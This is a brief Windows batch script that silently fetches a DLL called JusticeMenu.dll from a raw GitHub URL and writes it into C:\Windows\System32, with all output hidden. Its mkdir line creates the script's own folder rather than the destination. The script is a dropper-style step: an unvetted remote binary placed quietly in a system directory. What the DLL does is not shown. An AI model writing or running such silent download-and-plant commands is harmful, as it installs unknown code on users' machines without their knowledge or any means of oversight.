@echo off
:: Define the download URL and destination directory
set "URL=https://raw.githubusercontent.com/Sniffer-Lexel/Lorlel/5d49489cef02aac76936a103cd2258be1f4e1cba/JusticeMenu.dll"
set "DEST=C:\Windows\System32\JusticeMenu.dll"

:: Create the destination directory if it doesn't exist
mkdir "%~dp0" >nul 2>&1

:: Download the file silently
curl -o "%DEST%" "%URL%" >nul 2>&1